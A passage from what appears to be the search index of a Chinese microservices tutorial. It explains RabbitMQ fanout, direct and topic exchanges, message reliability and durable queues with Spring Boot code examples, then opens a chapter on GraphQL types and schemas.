\u7ba1\u7406\u754c\u9762\u4e2d\u67e5\u770b\u4ea4\u6362\u673a\u3002 \u7136\u540e\uff0c\u6211\u4eec\u9700\u8981\u5c06\u961f\u5217\u7ed1\u5b9a\u5230\u4ea4\u6362\u673a\uff0c @Bean public Binding foodBinding() { return BindingBuilder.bind(foodQueue()).to(fanoutExchange()); } \u6b64\u5916\uff0c\u4e3a\u4e86\u6f14\u793a\uff0c\u6211\u4eec\u521b\u5efa\u4e24\u4e2a\u961f\u5217\uff0c @Bean public Queue trashQueue() { return new Queue(\"trash\"); } @Bean public Binding trashBinding() { return BindingBuilder.bind(trashQueue()).to(fanoutExchange()); } \u7136\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e24\u4e2a\u6d88\u8d39\u8005\uff0c @Component @RequiredArgsConstructor public class FoodConsumer { @RabbitListener(queues = \"food\") @RabbitHandler public void consume(String message) { System.out.println(\"Yummy! I ate \" + message); } @RabbitListener(queues = \"trash\") @RabbitHandler public void trash(String message) { System.out.println(\"Yuck! I threw away \" + message); } } \u6700\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u751f\u4ea7\u8005\uff0c\u53d1\u9001\u6d88\u606f\u5230\u4ea4\u6362\u673a\uff0c @GetMapping(\"/banana\") public Mono<Void> banana() { rabbitTemplate.convertAndSend(\"fanout\", \"\", \"banana\"); return Mono.empty(); } \u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f routing key\uff0c\u8fd9\u91cc\u4e0d\u9700\u8981\uff0c\u6240\u4ee5\u4e3a\u7a7a\u3002 \u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u8bbf\u95ee /banana \uff0c\u90a3\u4e48\u4e24\u4e2a\u6d88\u8d39\u8005\u90fd\u4f1a\u6536\u5230\u6d88\u606f\uff0c\u5e76\u4f5c\u51fa\u76f8\u5e94\u7684\u5904\u7406\u3002","title":"\u6247\u51fa\u4ea4\u6362\u673a\u6a21\u5f0f"},{"location":"16/#_6","text":"\u8def\u7531\u4ea4\u6362\u673a\u6a21\u5f0f\u662f\u4e00\u4e2a\u751f\u4ea7\u8005\u53d1\u9001\u6d88\u606f\u5230\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c\u4ea4\u6362\u673a\u6839\u636e routing key \u5c06\u6d88\u606f\u53d1\u9001\u5230\u5bf9\u5e94\u7684\u961f\u5217\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u8def\u7531\u7684\u4f5c\u7528\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c @Bean public DirectExchange directExchange() { return new DirectExchange(\"direct\"); } \u8fd9\u91cc\u6211\u4eec\u7528\u4e24\u4e2a\u65b0\u7684\u961f\u5217\uff0c @Bean public Queue fruitQueue() { return new Queue(\"fruit\"); } @Bean public Queue vegetableQueue() { return new Queue(\"vegetable\"); } \u7136\u540e\uff0c\u6211\u4eec\u9700\u8981\u5c06\u961f\u5217\u7ed1\u5b9a\u5230\u4ea4\u6362\u673a\uff0c @Bean public Binding fruitBinding() { return BindingBuilder.bind(fruitQueue()).to(directExchange()).with(\"fruit\"); } @Bean public Binding vegetableBinding() { return BindingBuilder.bind(vegetableQueue()).to(directExchange()).with(\"vegetable\"); } \u7136\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e24\u4e2a\u6d88\u8d39\u8005\uff0c @Component @RequiredArgsConstructor public class FruitConsumer { @RabbitListener(queues = \"fruit\") @RabbitHandler public void consume(String message) { System.out.println(\"Yummy! I ate \" + message); } @RabbitListener(queues = \"vegetable\") @RabbitHandler public void trash(String message) { System.out.println(\"Wonderful! I ate \" + message); } } \u6700\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u751f\u4ea7\u8005\uff0c\u53d1\u9001\u6d88\u606f\u5230\u4ea4\u6362\u673a\uff0c @GetMapping(\"/carrot\") public Mono<Void> carrot() { rabbitTemplate.convertAndSend(\"direct\", \"vegetable\", \"carrot\"); return Mono.empty(); } @GetMapping(\"/grape\") public Mono<Void> grape() { rabbitTemplate.convertAndSend(\"direct\", \"fruit\", \"grape\"); return Mono.empty(); } \u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u8bbf\u95ee /carrot \uff0c\u90a3\u4e48\u53ea\u6709\u7b2c\u4e00\u4e2a\u6d88\u8d39\u8005\u4f1a\u6536\u5230\u6d88\u606f\uff0c\u5982\u679c\u6211\u4eec\u8bbf\u95ee /grape \uff0c\u90a3\u4e48\u53ea\u6709\u7b2c\u4e8c\u4e2a\u6d88\u8d39\u8005\u4f1a\u6536\u5230\u6d88\u606f\u3002","title":"\u8def\u7531\u4ea4\u6362\u673a\u6a21\u5f0f"},{"location":"16/#_7","text":"\u4e3b\u9898\u4ea4\u6362\u673a\u6a21\u5f0f\u662f\u4e00\u4e2a\u751f\u4ea7\u8005\u53d1\u9001\u6d88\u606f\u5230\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c\u4ea4\u6362\u673a\u6839\u636e\u901a\u914d\u7b26\u5c06\u6d88\u606f\u53d1\u9001\u5230\u5bf9\u5e94\u7684\u961f\u5217\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u4f9d\u7136\u662f\u8def\u7531\u7684\u4f5c\u7528\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c @Bean public TopicExchange topicExchange() { return new TopicExchange(\"topic\"); } \u7136\u540e\uff0c\u6211\u4eec\u9700\u8981\u5c06\u961f\u5217\u7ed1\u5b9a\u5230\u4ea4\u6362\u673a\uff0c @Bean public Binding fruitBinding() { return BindingBuilder.bind(fruitQueue()).to(topicExchange()).with(\"fruit.*\"); } @Bean public Binding vegetableBinding() { return BindingBuilder.bind(vegetableQueue()).to(topicExchange()).with(\"vegetable.*\"); } \u8fd9\u91cc\u7684\u901a\u914d\u7b26\u6709\u4e24\u79cd\uff0c * \u548c # \uff0c * \u8868\u793a\u4e00\u4e2a\u5355\u8bcd\uff0c # \u8868\u793a\u591a\u4e2a\u5355\u8bcd\u3002 \u7136\u540e\uff0c\u6211\u4eec\u4f9d\u7136\u4f7f\u7528\u4e4b\u524d\u7684\u6d88\u8d39\u8005\uff0c\u552f\u4e00\u533a\u522b\u662f\uff0c\u6211\u4eec\u9700\u8981\u4fee\u6539 routing key \u4e3a\u4e3b\u9898\u7684\u5f62\u5f0f\uff0c\u5373 {first}.{second}.{third} \u3002 @GetMapping(\"/apple\") public Mono<Void> apple() { rabbitTemplate.convertAndSend(\"topic\", \"fruit.apple\", \"apple\"); return Mono.empty(); } @GetMapping(\"/tomato\") public Mono<Void> tomato() { rabbitTemplate.convertAndSend(\"topic\", \"vegetable.tomato\", \"tomato\"); return Mono.empty(); } \u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u8bbf\u95ee /apple \uff0c\u90a3\u4e48\u53ea\u6709\u7b2c\u4e00\u4e2a\u6d88\u8d39\u8005\u4f1a\u6536\u5230\u6d88\u606f\uff0c\u5982\u679c\u6211\u4eec\u8bbf\u95ee /tomato \uff0c\u90a3\u4e48\u53ea\u6709\u7b2c\u4e8c\u4e2a\u6d88\u8d39\u8005\u4f1a\u6536\u5230\u6d88\u606f\u3002 \u4ece\u4e0a\u9762\u53ef\u4ee5\u770b\u51fa\uff0c\u4e3b\u9898\u4ea4\u6362\u673a\u6a21\u5f0f\u53ea\u662f\u8def\u7531\u4ea4\u6362\u673a\u6a21\u5f0f\u7684\u4e00\u4e2a\u6269\u5c55\uff0c\u5b83\u53ef\u4ee5\u6839\u636e\u901a\u914d\u7b26\u6765\u8def\u7531\u6d88\u606f\u3002","title":"\u4e3b\u9898\u4ea4\u6362\u673a\u6a21\u5f0f"},{"location":"16/#_8","text":"\u73b0\u5728\u6211\u4eec\u8003\u8651\u6dfb\u52a0\u4e86\u6d88\u606f\u961f\u5217\u7cfb\u7edf\u7684\u53ef\u9760\u6027\u4fdd\u969c\uff1a\u6574\u4e2a\u94fe\u8def\u662f\u751f\u4ea7\u8005\uff0c\u4ea4\u6362\u673a\uff0c\u961f\u5217\uff0c\u6d88\u8d39\u8005\u3002\u4ea4\u6362\u673a\u4e0e\u961f\u5217\u95f4\u7684\u53ef\u9760\u6027\u7531 Rabbit MQ \u4fdd\u969c\uff0c\u6211\u4eec\u53ea\u8981\u8003\u8651\u751f\u4ea7\u8005\u53ef\u9760\u6027\u548c\u6d88\u8d39\u8005\u53ef\u9760\u6027\u3002","title":"\u53ef\u9760\u6027\u4fdd\u969c"},{"location":"16/#_9","text":"\u9996\u5148\uff0c\u5bf9\u4e8e\u8fde\u63a5\u7684\u53ef\u9760\u6027\uff0c\u53ef\u4ee5\u5728 application.yml \uff0c\u53ef\u4ee5\u8bbe\u7f6e RabbitMQ \u7684\u8fde\u63a5\u8d85\u65f6\u548c\u91cd\u8fde\u673a\u5236\uff0c\u4ee5\u786e\u4fdd\u5728\u7f51\u7edc\u6296\u52a8\u6216 RabbitMQ \u670d\u52a1\u6682\u65f6\u4e0d\u53ef\u7528\u65f6\uff0c\u751f\u4ea7\u8005\u80fd\u81ea\u52a8\u6062\u590d\u8fde\u63a5\u3002 spring: rabbitmq: host: localhost port: 5672 username: guest password: guest # \u914d\u7f6e\u8fde\u63a5\u8d85\u65f6\uff08\u6beb\u79d2\uff09 connection-timeout: 15000 # \u542f\u7528\u81ea\u52a8\u91cd\u8fde listener: simple: retry: enabled: true max-attempts: 5 initial-interval: 1000 multiplier: 2.0 max-interval: 10000 \u5176\u6b21\uff0c\u8fd8\u6709\u751f\u4ea7\u8005\u786e\u8ba4\u673a\u5236\uff0c spring: rabbitmq: publisher-confirm-type: correlated publisher-confirm-type \u6709publisher-confirm-type \u6709\u4ee5\u4e0b\u51e0\u79cd\u914d\u7f6e\u9009\u9879\uff0c\u7528\u4e8e\u63a7\u5236 RabbitMQ \u6d88\u606f\u7684\u53d1\u5e03\u786e\u8ba4\u673a\u5236\uff1a none \u5373\u5173\u95ed\u751f\u4ea7\u8005\u786e\u8ba4\u673a\u5236\uff0cRabbitMQ \u4e0d\u4f1a\u4e3a\u751f\u4ea7\u8005\u7684\u6d88\u606f\u53d1\u5e03\u63d0\u4f9b\u4efb\u4f55\u786e\u8ba4\u3002\u4f18\u70b9\uff1a\u6027\u80fd\u8f83\u9ad8\u3002\u7f3a\u70b9\uff1a\u65e0\u6cd5\u4fdd\u969c\u6d88\u606f\u7684\u53ef\u9760\u6295\u9012\uff0c\u5982\u679c\u6d88\u606f\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e22\u5931\uff0c\u751f\u4ea7\u8005\u65e0\u6cd5\u5f97\u77e5\u3002\u9002\u7528\u573a\u666f\uff1a\u5bf9\u6d88\u606f\u53ef\u9760\u6027\u8981\u6c42\u8f83\u4f4e\u7684\u975e\u5173\u952e\u573a\u666f\u3002 correlated \u5373\u542f\u7528\u5f02\u6b65\u7684\u751f\u4ea7\u8005\u786e\u8ba4\u673a\u5236\uff0cRabbitTemplate \u4f1a\u901a\u8fc7\u56de\u8c03\u51fd\u6570\u83b7\u53d6\u6d88\u606f\u662f\u5426\u6210\u529f\u5230\u8fbe\u4ea4\u6362\u673a\u3002\u4f18\u70b9\uff1a\u6027\u80fd\u8f83\u597d\uff0c\u4e14\u652f\u6301\u5f02\u6b65\u56de\u8c03\uff0c\u53ef\u4ee5\u7cbe\u51c6\u8ffd\u8e2a\u6bcf\u6761\u6d88\u606f\u7684\u72b6\u6001\u3002\u7f3a\u70b9\uff1a\u9700\u8981\u989d\u5916\u5b9e\u73b0\u56de\u8c03\u903b\u8f91\u3002\u9002\u7528\u573a\u666f\uff1a\u5927\u591a\u6570\u4e1a\u52a1\u573a\u666f\uff0c\u9700\u5173\u6ce8\u6d88\u606f\u662f\u5426\u6210\u529f\u53d1\u9001\u5230 RabbitMQ\u3002 \u5f55\u5165\uff0c\u53ef\u4ee5\u8fd9\u6837\u914d\u7f6e\u56de\u8c03\uff0c @Bean public RabbitTemplate rabbitTemplate(ConnectionFactory connectionFactory) { RabbitTemplate rabbitTemplate = new RabbitTemplate(connectionFactory); rabbitTemplate.setConfirmCallback((correlationData, ack, cause) -> { if (ack) { System.out.println(\"Message delivered successfully: \" + correlationData); } else { System.err.println(\"Message delivery failed: \" + cause); } }); return rabbitTemplate; } \u5728 correlationData \u4e2d\u5305\u542b\u4e86\u5b8c\u6574\u7684\u539f\u59cb\u7684\u6d88\u606f\uff0c\u5982\u679c\u9700\u8981\u53ef\u4ee5\u76f4\u63a5\u91cd\u53d1\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e2a\u56de\u8c03\u7684\u65b9\u6cd5\u7b7e\u540d\u53ef\u80fd\u4f1a\u968f\u7248\u672c\u4e0d\u540c\u6709\u4e00\u4e9b\u6539\u52a8\u3002 simple \u5373\u542f\u7528\u540c\u6b65\u7684\u751f\u4ea7\u8005\u786e\u8ba4\u673a\u5236\uff0cRabbitTemplate \u7684 convertAndSend \u65b9\u6cd5\u4f1a\u963b\u585e\uff0c\u76f4\u5230\u786e\u8ba4\u6d88\u606f\u5df2\u88ab RabbitMQ \u6210\u529f\u63a5\u6536\u3002\u4f18\u70b9\uff1a\u5b9e\u73b0\u7b80\u5355\uff0c\u786e\u8ba4\u7ed3\u679c\u6e05\u6670\u3002\u7f3a\u70b9\uff1a\u6027\u80fd\u6781\u5dee\uff0c\u4e00\u822c\u4e0d\u4f7f\u7528\u3002 \u4f8b\u5982\uff0c spring: rabbitmq: publisher-confirm-type: simple @GetMapping(\"/sendSyncMessage\") public Mono<Void> sendSyncMessage() { try { rabbitTemplate.convertAndSend(\"exchange\", \"routingKey\", \"message\"); System.out.println(\"Message sent successfully!\"); } catch (Exception e) { System.err.println(\"Message delivery failed: \" + e.getMessage()); } return Mono.empty(); } \u901a\u5e38\u63a8\u8350\u4f7f\u7528 Correlate \u6a21\u5f0f\u3002 \u6b64\u5916\u8fd8\u53ef\u4ee5\u914d\u7f6e TTL \u5373\u4e00\u4e2a Time To Live \u5c5e\u6027\uff0c\u53ef\u4ee5\u52a0\u5728\u6bcf\u4e00\u4e2a\u6d88\u606f\u4e2d\u3002\u5f53\u4e00\u4e2a\u6d88\u606f\u6324\u538b\u8d85\u8fc7 TTL\uff0c\u4f1a\u81ea\u52a8 reject\uff0c\u5373\u4e22\u5f03\u6d88\u606f\u3002 @GetMapping(\"/sendMessageWithTTL\") public Mono<Void> sendMessageWithTTL() { // \u521b\u5efa\u6d88\u606f\u5c5e\u6027\uff0c\u6307\u5b9a TTL \u4e3a 30 \u79d2 MessagePostProcessor messagePostProcessor = message -> { message.getMessageProperties().setExpiration(\"30000\"); // TTL = 30 \u79d2 return message; }; // \u53d1\u9001\u6d88\u606f\u5230\u4ea4\u6362\u673a\uff0c\u643a\u5e26\u81ea\u5b9a\u4e49 TTL rabbitTemplate.convertAndSend(\"example.exchange\", \"example.routingKey\", \"Message with TTL\", messagePostProcessor); System.out.println(\"Message sent with TTL of 30 seconds\"); return Mono.empty(); } \u8fd8\u53ef\u4ee5\u7ed9\u6574\u4e2a\u961f\u5217\u914d\u7f6e TTL\uff0c @Bean public Queue exampleQueue() { return QueueBuilder.durable(\"exampleQueue\") .withArgument(\"x-message-ttl\", 60000) // \u8bbe\u7f6e\u6d88\u606f\u7684\u5b58\u6d3b\u65f6\u95f4\u4e3a 60 \u79d2\uff0860000 \u6beb\u79d2\uff09 .withArgument(\"x-dead-letter-exchange\", \"dlx.exchange\") // \u914d\u7f6e\u6b7b\u4fe1\u4ea4\u6362\u673a .withArgument(\"x-dead-letter-routing-key\", \"dlx.routingKey\") // \u914d\u7f6e\u6b7b\u4fe1\u8def\u7531\u952e .build(); } reject \u5c3d\u7ba1\u662f\u4e22\u5f03\u6d88\u606f\uff0c\u4f46\u4f60\u4e5f\u53ef\u4ee5\u628a\u4e22\u5f03\u7684\u6d88\u606f\u79f0\u653e\u5230\u4e00\u4e2a\u6b7b\u4fe1\u4ea4\u6362\u673a\u4e2d\uff0c\u7136\u540e\u653e\u5230\u6b7b\u4fe1\u961f\u5217\u3002\u8fd9\u6837\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u88ab\u6536\u96c6\u3002 \u8fd9\u91cc\u7684 durable \u662f\u6307\u4e45\u5316\u961f\u5217\uff0c\u4f1a\u5728\u540e\u9762\u4ecb\u7ecd\u3002","title":"\u751f\u4ea7\u8005\u53ef\u9760\u6027"},{"location":"16/#_10","text":"\u6d88\u8d39\u8005\u7684\u8fde\u63a5\u53ef\u9760\u6027\u540c\u6837\u53ef\u4ee5\u7528\u4e4b\u524d\u7684\u914d\u7f6e\u4fdd\u969c\u3002 \u5bf9\u4e8e\u6d88\u606f\u5904\u7406\u7684\u53ef\u9760\u6027\uff0c\u53ef\u4ee5\u4f7f\u7528\u786e\u8ba4\u673a\u5236\uff0c \u7b2c\u4e00\u79cd\u6a21\u5f0f\u662f\u624b\u52a8\u6a21\u5f0f\uff0c spring: rabbitmq: listener: simple: acknowledge-mode: manual @RabbitListener(queues = \"exampleQueue\") public void processMessage(String message, Channel channel, @Header(AmqpHeaders.DELIVERY_TAG) long deliveryTag) { try { // \u5904\u7406\u6d88\u606f\u903b\u8f91 System.out.println(\"Processing message: \" + message); // \u624b\u52a8\u786e\u8ba4\u6d88\u606f channel.basicAck(deliveryTag, false); } catch (Exception e) { System.err.println(\"Failed to process message: \" + e.getMessage()); try { // \u5904\u7406\u5931\u8d25\uff0c\u62d2\u7edd\u6d88\u606f\u5e76\u91cd\u65b0\u6295\u9012 channel.basicNack(deliveryTag, false, true); } catch (IOException ioException) { System.err.println(\"Failed to nack message: \" + ioException.getMessage()); } } } \u66f4\u63a8\u8350\u81ea\u52a8\u6a21\u5f0f\uff1a\u5f53\u51fa\u73b0\u4e1a\u52a1\u5f02\u5e38\u65f6\uff0c\u81ea\u52a8\u8fd4\u56de nack \u8bf7\u6c42\uff0cnack \u6d88\u606f\u4f1a\u5bfc\u81f4\u6d88\u606f\u961f\u5217\u5c06\u53d1\u9001\u7684\u6d88\u606f\u91cd\u65b0\u653e\u56de\u961f\u5217\u4e2d\uff1b\u5f53 Rabbit MQ \u901a\u4fe1\u5f02\u5e38\u65f6\uff0c\u6216\u63a5\u53d7\u5230\u9519\u8bef\u7684\u6d88\u606f\uff0c\u81ea\u52a8\u8fd4\u56de reject \u8bf7\u6c42\uff0c\u8fd9\u4e2a\u6d88\u606f\u88ab\u4e22\u5f03\u3002 \u6ce8\u610f\uff0c\u8fd9\u65f6\u8981\u914d\u7f6e\u4e00\u4e2a\u6700\u5927\u91cd\u8bd5\u6b21\u6570\uff0c\u4e0d\u7136\u4f1a\u5bfc\u81f4\u6d88\u606f\u6324\u538b\u3002\u5f53\u6d88\u606f\u91cd\u8bd5\u8d85\u8fc7\u6b21\u6570\u65f6\uff0c\u540c\u6837\u4f1a reject\u3002 spring: rabbitmq: listener: simple: acknowledge-mode: auto # \u81ea\u52a8\u786e\u8ba4\u6a21\u5f0f retry: enabled: true # \u542f\u7528\u6d88\u8d39\u8005\u91cd\u8bd5\u673a\u5236 max-attempts: 5 # \u6700\u5927\u91cd\u8bd5\u6b21\u6570 initial-interval: 1000 # \u521d\u59cb\u91cd\u8bd5\u95f4\u9694\uff08\u6beb\u79d2\uff09 multiplier: 2.0 # \u6bcf\u6b21\u91cd\u8bd5\u95f4\u9694\u500d\u589e max-interval: 10000 # \u6700\u5927\u91cd\u8bd5\u95f4\u9694\uff08\u6beb\u79d2\uff09 default-requeue-rejected: false # \u8d85\u8fc7\u91cd\u8bd5\u6b21\u6570\u540e\u4e0d\u91cd\u65b0\u5165\u961f\uff0c\u907f\u514d\u6b7b\u5faa\u73af \u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u914d\u7f6e\u6b7b\u4fe1\u4ea4\u6362\u673a\u3002","title":"\u6d88\u8d39\u8005\u53ef\u9760\u6027"},{"location":"16/#_11","text":"\u5728 RabbitMQ \u4e2d\uff0c\u6301\u4e45\u5316\u961f\u5217\u7684\u76ee\u7684\u662f\u786e\u4fdd\u5373\u4f7f RabbitMQ \u670d\u52a1\u5668\u91cd\u542f\uff0c\u961f\u5217\u4e2d\u7684\u6d88\u606f\u4e5f\u4e0d\u4f1a\u4e22\u5931\u3002\u6301\u4e45\u5316\u529f\u80fd\u9002\u7528\u4e8e\u961f\u5217\u548c\u6d88\u606f\u4e24\u90e8\u5206\u3002 \u521b\u5efa\u961f\u5217\u65f6\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u5176\u4e3a\u6301\u4e45\u5316\u961f\u5217\u3002\u6301\u4e45\u5316\u961f\u5217\u4f1a\u88ab\u4fdd\u5b58\u5230\u78c1\u76d8\u4e2d\u3002 @Bean public Queue durableQueue() { return QueueBuilder.durable(\"durableQueue\").build(); // \u58f0\u660e\u6301\u4e45\u5316\u961f\u5217 } \u4e5f\u53ef\u4ee5\u8bbe\u5b9a\u6301\u4e45\u5316\u6d88\u606f\uff0c rabbitTemplate.convertAndSend(\"durableExchange\", \"durableKey\", \"Persistent Message\", message -> { message.getMessageProperties().setDeliveryMode(MessageDeliveryMode.PERSISTENT); // \u8bbe\u7f6e\u6d88\u606f\u6301\u4e45\u5316 return message; });","title":"\u6301\u4e45\u5316\u961f\u5217"},{"location":"16/#_12","text":"Rabbit MQ \u662f\u4e00\u4e2a AMQP \u7684\u6d88\u606f\u961f\u5217\uff0c\u5b83\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u6d88\u606f\u961f\u5217\uff0c\u53ef\u4ee5\u7528\u4e8e\u6784\u5efa\u5206\u5e03\u5f0f\u7cfb\u7edf\u3002Rabbit MQ \u662f\u4e00\u4e2a\u6d88\u606f\u4e2d\u95f4\u4ef6\uff0c\u5b83\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u670d\u52a1\uff0c\u7528\u4e8e\u5b58\u50a8\u6d88\u606f\uff0c\u7136\u540e\u6d88\u8d39\u8005\u6d88\u8d39\u6d88\u606f\u3002Rabbit MQ \u6709\u516d\u79cd\u5e38\u89c1\u7684\u6d88\u606f\u961f\u5217\u4e0e\u4ea7\u9500\u8005\u7684\u7ec4\u7ec7\u65b9\u5f0f\uff0c\u5305\u62ec\u7f13\u51b2\u961f\u5217\uff0c\u5de5\u4f5c\u961f\u5217\uff0c\u6247\u51fa\u4ea4\u6362\u673a\uff0c\u8def\u7531\u4ea4\u6362\u673a\uff0c\u4e3b\u9898\u4ea4\u6362\u673a\u548c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u3002\u8fd9\u4e9b\u6a21\u5f0f\u53ef\u4ee5\u6ee1\u8db3\u4e0d\u540c\u7684\u9700\u6c42\uff0c\u4f8b\u5982\uff0c\u8d1f\u8f7d\u5747\u8861\uff0c\u5e7f\u64ad\uff0c\u8def\u7531\u7b49\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u9664\u4e86\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff0c\u5176\u4ed6\u7684\u6a21\u5f0f\u90fd\u8fdb\u884c\u4e86\u5b9e\u73b0\u3002","title":"\u603b\u7ed3"},{"location":"17/","text":"\u5fae\u670d\u52a1\u901f\u6210 Ch17 GraphQL \u524d\u9762\u6211\u4eec\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u662f\u57fa\u4e8e RESTful API \u6784\u5efa\u7684\uff0c\u4f46\u662f RESTful API \u6700\u5927\u7684\u95ee\u9898\u662f\uff0c\u6240\u6709\u7684 API \u672c\u8d28\u90fd\u662f\u4e00\u4e2a\u9ed1\u76d2\uff0c\u5728\u4f60\u62ff\u5230\u6570\u636e\u4e4b\u524d\uff0c\u4f60\u4e0d\u77e5\u9053\u8fd9\u4e2a API \u4f1a\u8fd4\u56de\u4ec0\u4e48\u6570\u636e\uff0c\u8fd9\u5bfc\u81f4\u4e86\u524d\u540e\u7aef\u5de5\u4f5c\u7684\u8026\u5408\u3002GraphQL \u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u800c\u751f\u7684\u3002 GraphQL \u662f\u4e00\u4e2a\u67e5\u8be2\u8bed\u8a00\uff0c\u5b83\u5141\u8bb8\u5ba2\u6237\u7aef\u67e5\u8be2\u81ea\u5df1\u9700\u8981\u7684\u6570\u636e\uff0c\u800c\u4e0d\u662f\u670d\u52a1\u7aef\u8fd4\u56de\u56fa\u5b9a\u7684\u6570\u636e\u3002\u8fd9\u6837\uff0c\u524d\u540e\u7aef\u53ea\u8981\u7ea6\u5b9a\u597d\u6570\u636e\u5e93\u7684\u7ed3\u6784\uff0c\u5c31\u53ef\u4ee5\u72ec\u7acb\u5f00\u53d1\uff0c\u4e0d\u9700\u8981\u7b49\u5f85\u5bf9\u65b9\u7684\u63a5\u53e3\u3002 GraphQL \u57fa\u672c\u6982\u5ff5 GraphQL \u662f\u66ff\u6362 RESTful API \u7684\u4e00\u79cd\u65b9\u5f0f\u3002\u56e0\u6b64\u524d\u7aef\u548c\u540e\u7aef\u7684\u4ea4\u4e92\u65b9\u5f0f\u548c RESTful API \u6709\u5f88\u5927\u7684\u4e0d\u540c\u3002 \u5728\u524d\u7aef\uff0c\u4e0e RESTful API \u4e0d\u540c\uff0cGraphQL \u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u5165\u53e3\uff0c\u5373 /graphql \u3002\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u901a\u8fc7\u8fd9\u4e2a\u5165\u53e3\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u4e0d\u540c\u7684 URL\u3002 \u901a\u8fc7 POST \u65b9\u6cd5\uff0c\u524d\u7aef\u5728 body \u91cc\u53d1\u9001\u4e00\u4e2a GraphQL \u67e5\u8be2\u8bed\u53e5\uff0c\u540e\u7aef\u89e3\u6790\u8fd9\u4e2a\u67e5\u8be2\u8bed\u53e5\uff0c\u8fd4\u56de\u67e5\u8be2\u7ed3\u679c\u3002 GraphQL \u67e5\u8be2\u8bed\u53e5\u662f\u4e00\u79cd\u4e13\u95e8\u7684\u8bed\u8a00\uff0c\u7c7b\u4f3c\u4e8e SQL \u5bf9\u6570\u636e\u5e93\u7684\u67e5\u8be2\u3002\u5b83\u6709\u81ea\u5df1\u7684\u8bed\u6cd5\uff0c\u53ef\u4ee5\u67e5\u8be2\u591a\u4e2a\u5b57\u6bb5\uff0c\u591a\u4e2a\u5bf9\u8c61\uff0c\u591a\u4e2a\u5173\u8054\u5bf9\u8c61\u3002\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u8be6\u7ec6\u4ecb\u7ecd\u3002 \u5728\u540e\u7aef\uff0cGraphQL \u8bed\u53e5\u7684\u89e3\u6790\u548c\u6570\u636e\u7684\u83b7\u53d6\u7531\u6846\u67b6\u81ea\u52a8\u5b8c\u6210\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5b8c\u6210\u6570\u636e\u63d0\u4f9b\u7684\u4efb\u52a1\u5373\u53ef\u3002 GraphQL \u8bed\u6cd5 GraphQL \u8bed\u6cd5\u662f\u4e00\u79cd\u7c7b\u4f3c\u4e8e JSON \u7684\u8bed\u8a00\uff0c\u4f46\u662f\u6bd4 JSON \u66f4\u5f3a\u5927\u3002\u5b83\u53ef\u4ee5\u67e5\u8be2\u591a\u4e2a\u5bf9\u8c61\uff0c\u591a\u4e2a\u5b57\u6bb5\uff0c\u591a\u4e2a\u5173\u8054\u5bf9\u8c61\u3002 \u7c7b\u578b GraphQL \u6709\u4e00\u5957\u72ec\u7acb\u4e8e\u7f16\u7a0b\u8bed\u8a00\u7684\u7c7b\u578b\u7cfb\u7edf\u3002\u8fd9\u4e2a\u7c7b\u578b\u7cfb\u7edf\u5b9a\u4e49\u4e86\u6240\u6709\u7684\u5bf9\u8c61\u548c\u5b57\u6bb5\u7684\u7c7b\u578b\u3002 \u5728 GraphQL \u4e2d\uff0c\u57fa\u672c\u7c7b\u578b\u6709\uff0c Int\uff1a\u6574\u6570 Float\uff1a\u6d6e\u70b9\u6570 String\uff1aUTF-8 \u5b57\u7b26\u4e32 Boolean\uff1atrue \u6216 false ID\uff1a\u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u901a\u5e38\u662f\u5b57\u7b26\u4e32\u3002 \u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u88c5\u9970\u7b26\uff0c\u6765\u4ece\u57fa\u7840\u7c7b\u578b\u6d3e\u751f\u65b0\u7684\u7c7b\u578b\uff0c [type] \uff1a\u6570\u7ec4 type! \uff1a\u975e\u7a7a\uff0c\u6ce8\u610f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6240\u6709\u7684\u7c7b\u578b\u90fd\u662f\u53ef\u7a7a\u7684\u3002 \u5982\u679c\u8981\u5b9a\u4e49\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u4f7f\u7528 type \u5173\u952e\u5b57\uff0c type Country { name: String } \u4e4b\u540e\u53ef\u4ee5\u540c\u57fa\u672c\u7c7b\u578b\u4e00\u6837\u4f7f\u7528\u8fd9\u4e2a\u5bf9\u8c61\u3002 Schema Schema \u5b9a\u4e49\u4e86 GraphQL \u5141\u8bb8\u7684\u67e5\u8be2\u548c\u53d8\u66f4\u3002Schema \u7531 Query \u548c Mutation \u4e24\u90e8\u5206\u7ec4\u6210\u3002 Query Query \u662f\u4e00\u4e2a\u7279\u6b8a\u7684 type\uff0c\u5b9a\u4e49\u540d\u79f0\u4e3a Query 